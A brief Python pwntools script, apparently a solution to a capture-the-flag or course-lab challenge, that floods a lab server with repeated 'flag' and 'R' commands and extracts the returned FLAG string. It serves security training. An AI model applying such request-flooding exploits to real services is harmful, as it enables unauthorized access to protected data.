#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

if __name__ == "__main__":
    
    r = remote('up.zoolab.org', 10931)
    
    payload = "flag\nR\n" * 100
    r.send(payload.encode())
    recv = r.recvuntil('}'.encode()).decode()
    
    r.close();
    print( recv[recv.find('FLAG{'):] )
